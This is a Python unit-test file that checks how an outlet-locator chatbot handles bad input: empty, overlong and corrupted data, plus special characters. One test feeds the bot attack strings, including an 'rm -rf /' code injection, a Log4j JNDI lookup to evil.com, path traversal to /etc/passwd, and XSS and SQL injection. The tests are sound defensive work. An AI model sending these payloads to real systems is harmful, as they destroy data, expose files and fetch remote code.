import unittest
import sys
import os
from unittest.mock import patch, Mock

# Add parent directories to path to import from Question_1
sys.path.append(os.path.join(os.path.dirname(__file__), '../../Question_1'))

from sequential_conversation import SequentialConversationBot, ConversationState
from data import OUTLETS_DB


class TestUnhappySequentialConversation(unittest.TestCase):
    """Test suite for unhappy flows in sequential conversation system"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.bot = SequentialConversationBot()
    
    def test_empty_input(self):
        """Test handling of empty or whitespace-only input"""
        empty_inputs = ["", "   ", "\n", "\t", "\r\n"]
        
        for empty_input in empty_inputs:
            with self.subTest(input=repr(empty_input)):
                response = self.bot.process_input(empty_input)
                self.assertIn("didn't catch that", response.lower())
                self.assertIn("re-type", response.lower())
    
    def test_none_input(self):
        """Test handling of None input"""
        response = self.bot.process_input(None)
        self.assertIn("didn't catch that", response.lower())
    
    def test_very_long_input(self):
        """Test handling of extremely long input"""
        long_input = "A" * 10000  # 10KB of text
        response = self.bot.process_input(long_input)
        
        # Should not crash and should provide some response
        self.assertIsInstance(response, str)
        self.assertTrue(len(response) > 0)
    
    def test_special_characters_input(self):
        """Test handling of special characters that might break parsing"""
        special_inputs = [
            "outlets with special chars: @#$%^&*()",
            "What about <script>alert('xss')</script> outlets?",
            "Outlets in PJ; DROP TABLE outlets; --",
            "Find outlets\x00\x01\x02\x03",  # Binary data
            "Outlets with unicode: café ñaña 中文",
            "Outlets with newlines\nand\ttabs",
            "Outlets 'with' \"quotes\"",
            "Outlets\\with\\backslashes",
            "Outlets{with}brackets[and]parens()",
        ]
        
        for special_input in special_inputs:
            with self.subTest(input=special_input):
                response = self.bot.process_input(special_input)
                
                # Should not crash and should provide some response
                self.assertIsInstance(response, str)
                self.assertTrue(len(response) > 0)
                
                # Response should not contain dangerous patterns
                dangerous_patterns = ["<script", "drop table", "delete from"]
                for pattern in dangerous_patterns:
                    self.assertNotIn(pattern.lower(), response.lower())
    
    def test_malicious_payloads(self):
        """Test various malicious input attempts"""
        malicious_inputs = [
            "__import__('os').system('rm -rf /')",  # Code injection
            "eval('__import__(\"os\").system(\"ls\")')",  # Eval injection
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/exploit}",  # Log4j injection
            "../../etc/passwd",  # Path traversal
            "javascript:alert('XSS')",  # JavaScript injection
            "data:text/html,<script>alert('XSS')</script>",  # Data URL
            "\x1b[2J\x1b[H",  # ANSI escape sequences
        ]
        
        for malicious_input in malicious_inputs:
            with self.subTest(input=malicious_input):
                try:
                    response = self.bot.process_input(malicious_input)
                    
                    # Should not crash and should provide safe response
                    self.assertIsInstance(response, str)
                    self.assertTrue(len(response) > 0)
                    
                    # Should not execute arbitrary code or return dangerous content
                    safe_patterns = ["how can i help", "outlets", "location", "didn't catch"]
                    self.assertTrue(any(pattern in response.lower() for pattern in safe_patterns))
                    
                except Exception as e:
                    # If it raises an exception, it should be a controlled one
                    self.fail(f"Malicious input caused unhandled exception: {e}")
    
    # Removed excessive corruption and interruption simulation tests for brevity
    
    def test_memory_export_with_corrupted_data(self):
        """Test conversation export functionality with corrupted data"""
        # Add some normal conversation
        self.bot.process_input("Is there an outlet in PJ?")
        
        # Corrupt some turn data
        if self.bot.memory.turns:
            # Add malformed turn data
            self.bot.memory.turns[0].extracted_entities = {"corrupted": float('inf')}
            self.bot.memory.turns[0].context_variables = {"bad_data": {"nested": [1, 2, {"deep": None}]}}
        
        try:
            # Should not crash when exporting
            summary = self.bot.get_conversation_summary()
            self.assertIsInstance(summary, dict)
            
            debug_info = self.bot.get_debug_info()
            self.assertIsInstance(debug_info, dict)
            
        except Exception as e:
            self.fail(f"Conversation export failed with corrupted data: {e}")
    
    def tearDown(self):
        """Clean up after each test"""
        if hasattr(self, 'bot'):
            self.bot.reset_conversation()


if __name__ == "__main__":
    unittest.main() 